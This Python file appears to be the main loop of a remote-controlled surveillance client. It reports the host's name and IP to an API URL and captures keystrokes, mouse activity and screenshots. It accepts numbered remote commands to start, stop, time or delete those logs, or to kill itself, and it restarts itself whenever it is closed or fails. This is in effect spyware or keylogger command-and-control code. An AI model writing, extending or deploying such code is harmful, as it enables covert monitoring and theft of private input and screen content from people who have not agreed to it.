
from app._init_client import Env as env
from app._config import Config as client_config
from app._server import Server as server
from app.excpetion import ResetConfigException, kill
from app.capture.main import Capture_Main as capture
from app.tasks_functions import *
from app.functions import send_api, redirect_output,check_env, load_env, check_log, run_server_sub
import  threading, queue, subprocess, json, sys, asyncio #close terminal 

threads_done = threading.Event()

class Main_Sub_Server_Socket:
    """ Main server socket class """
    
    async def ainit(self,
                    PATH_LOG="./.log/",
                    PATH_JSON = "./.log/config.json",
                    force = False,
                    URL=""):
        
        """main function"""
        
        try:
            
            if threads_done.is_set():pass # If the thread is already running, do nothing
            elif not threads_done.is_set(): threads_done.set() # Set the thread as running

            #check if log file exist
            if not await check_log(): raise Exception() #if error, restart the main function
        
            #if .env file is not valid, we create it
            if force or not await check_env()  == True:
                # creating a suitable configuration
                generate_env = env()
                if not await generate_env.ainit(): raise Exception()
                
                #applying the configuration & save it on .env file
                generate_config = client_config()
                generated_config = await generate_config.ainit()
                if not generated_config: raise Exception()
            else: 
                generate_config = await load_env()
            
            # Queue for the server subprocess
            server_output_queue = queue.Queue()
            
            # Starting the server with the configuration
            start_server = server()
            if not await start_server.ainit(generate_config): return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL)#if error, restart the main function
                
            # Run the server subprocess
            server_process = run_server_sub()
            
            # Create a thread to read output
            server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))

            ## /!\ Start subprocess server /!\ ###
            try:
                server_output_thread.start()
            except: return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL) #if error, restart the main function
            ## /!\ Start subprocess server /!\ ###
            
            #when all is good, we can send data to api ---------------------------------DONT LOST THAT NAGIB :D -----------------------------
            send_api(URL, generate_config)
            # print("Server started")
            
            #Start capture
            generate_capture = capture(path_json=PATH_JSON,path_log=PATH_LOG,name=generate_config["NAME"],ip=generate_config["IP"])
            generate_capture.start_capture()
            
            while True:
                if subprocess.Popen.poll(server_process) != None:# Forced restart if the server is closed by ? entity
                    server_process = PAUSE_SERVER(1,server_process)
                    server_output_queue = queue.Queue()
                    server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))
                    server_output_thread.start()
                    
                    
                elif subprocess.Popen.poll(server_process) == None:# If is enabled
                    if not server_output_queue.empty(): # Check if the server has sent any output
                        line = server_output_queue.get()
                        if not line:# If the server has closed reset the queue and thread
                            server_output_queue = queue.Queue()
                            server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))
                            server_output_thread.start()
                        else:
                            
                            # Error gestion
                            if line != None:
                                data = str(line).replace("'", "\"")
                                data_json = json.loads(data)
                                if data_json['error'] == 404:line = None # If data is not recognized by the server, reset the queue and thread
                                else: 
                                    commande = int(data_json["index_task"])
                                    
                                    if commande == 0: 
                                        server_process = PAUSE_SERVER(int(data_json["x_break"]),server_process)
                                    
                        
                                    elif commande == 1:STOP_SERVER(server_process)
                                    elif commande == 2:STOP_CAPTURE_KEYBOARD()
                                    elif commande == 3:STOP_CAPTURE_MOUSE()
                                    elif commande == 4:STOP_CAPTURE_PICTURE()
                                    elif commande == 5:#check if need await or asyncio
                                        RESTART_SERVER()
                                        await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL) 
                                    elif commande == 6:#
                                        if not STOP_LOG_KEYBOARD(PATH_JSON):
                                            #Send from client to API > Send to Socket server
                                            pass
                                    elif commande == 7:#
                                        if not STOP_LOG_MOUSE(PATH_JSON):
                                            #Send from client to API > Send to Socket server
                                            pass
                                    elif commande == 8:#
                                        if not STOP_LOG_PICTURE(PATH_JSON):
                                            #Send from client to API > Send to Socket server
                                            pass
                                    elif commande == 9:#
                                        if not START_LOG_KEYBOARD(PATH_JSON):
                                            #Send from client to API > Send to Socket server
                                            pass
                                    elif commande == 10:#
                                        if not START_LOG_MOUSE(PATH_JSON):
                                            #Send from client to API > Send to Socket server
                                            pass
                                    elif commande == 11:#
                                        if not START_LOG_PICTURE(PATH_JSON):
                                            #Send from client to API > Send to Socket server
                                            pass
                                    elif commande == 12:#a modifier
                                        data = STATUS_SERVER(PATH_JSON)
                                        print(data)
                                    elif commande == 13:#
                                        data = STATUS_LOG(PATH_JSON)
                                        print(data)
                                    elif commande == 14:raise ResetConfigException#
                                    elif commande == 15:KILL()#raise kill #delete all
                                    elif commande == 16:
                                    
                                        if not data_json["timer"]:line = None
                                        elif not data_json["type"]:line = None
                                        
                                        
                                        timer_selected = int(data_json["timer"])
                                        type_selected = data_json["type"]
                                        
                                        if type_selected == "KEYBOARD":
                                            result = LOG_TIMER(type="KEYBOARD",timer=timer_selected,path=PATH_JSON)
                                            # print(result)
                                        elif  type_selected == "MOUSE":
                                            result = LOG_TIMER(type="MOUSE",timer=timer_selected,path=PATH_JSON)
                                            # print(result)
                                        elif  type_selected == "PICTURE":
                                            result = LOG_TIMER(type="PICTURE",timer=timer_selected,path=PATH_JSON)
                                            # print(result)
                                        elif  type_selected == "ALL":
                                            result = LOG_TIMER(type="ALL",timer=timer_selected,path=PATH_JSON)
                                            # print(result)
                                            
                                    elif commande == 17:
                                        type_selected = data_json["type"]
                                        if type_selected == "KEYBOARD":
                                            if not DELETE_LOG(type="KEYBOARD",path=PATH_LOG):print("keyboard folder already deleted")
                                            else: print("keyboard deleted")
                                        elif  type_selected == "MOUSE":
                                            if not DELETE_LOG(type="MOUSE",path=PATH_LOG):print("mouse folder already deleted")
                                            else: print("mouse deleted")
                                        elif  type_selected == "PICTURE":
                                            if not DELETE_LOG(type="PICTURE",path=PATH_LOG):print("picture folder already deleted")
                                            else: print("picture deleted")
                                        elif  type_selected == "ALL":
                                            if not DELETE_LOG(type="ALL",path=PATH_LOG):print("all folders already deleted")
                                            else:print("all deleted")
                                    elif commande == 18:MOVE()#voir comment faire
                                    elif commande == 19:PING()#
                                    elif commande == 20:#
                                        mode_selected = data_json["mode"]
                                        timer_selected = int(data_json["number"])
                                        
                                        if mode_selected == "TIMER":
                                            if not PICTURE_MODE(mode="TIMER",timer=timer_selected,path=PATH_JSON):print("Error")
                                            else: print("Timer set to {} seconds.".format(timer_selected))
                                        elif  mode_selected == "CLICK":
                                            if not PICTURE_MODE(mode="CLICK",timer=timer_selected,path=PATH_JSON):print("Error")
                                            else: print("Timer set to {} clicks.".format(timer_selected))
                                    elif commande == 21:
                                        pass
                                    else: print("Not implemented")
                                    line = None
        except kill:pass                       
        except ResetConfigException:
            RESET_CONFIG(server_process=server_process)
            return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL) 
        except Exception as err: print(err)
        finally: 
            RESET_CONFIG(server_process=server_process)
            print("[x] - Server close") # Signal the end of the thread
            return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL)

if sys.argv[0] == 'm_server.py':
    """ Run the server with arguments """

    if len(sys.argv) >= 2:
        url = None
        path_json = None
        path_log = None
        force = False

        # Parcourir les arguments et les analyser
        for arg in sys.argv[1:]:
            if arg.startswith("URL="):url = arg.split("=", 1)[1]
            elif arg.startswith("PATH_JSON="):path_json = arg.split("=", 1)[1]
            elif arg.startswith("PATH_LOG="):path_log = arg.split("=", 1)[1]
            elif arg == "force=True":force = True
            elif arg == "force=False":force = False
        server_c = Main_Sub_Server_Socket()
        asyncio.run(server_c.ainit(force=force,PATH_JSON=path_json,PATH_LOG=path_log,URL=url))
        threads_done.clear()
        sys.exit() #close terminal if exist
    else:pass#osef
